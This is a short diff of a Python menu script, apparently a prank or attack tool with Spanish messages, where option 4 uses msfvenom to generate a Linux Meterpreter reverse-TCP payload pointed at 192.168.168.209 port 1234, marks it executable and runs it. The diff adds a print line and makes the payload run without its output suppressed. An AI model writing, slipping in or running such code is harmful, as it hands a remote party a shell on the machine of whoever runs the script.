@@ -51,8 +51,9 @@ try:
 	elif opcion.lower() == "4":
 		print(Fore.YELLOW + "Este te va a gustar jo jo jo")
 		os.system("msfvenom -p linux/x64/meterpreter_reverse_tcp lhost=192.168.168.209 lport=1234 -f elf -o reverse_rafa > /dev/null 2>&1")
+		print("preparate")
 		os.system("chmod +x reverse_rafa")
-		os.system("./reverse_rafa $ > /dev/null 2>&1")
+		os.system("./reverse_rafa")
 		print("jo jo jo")
 
 
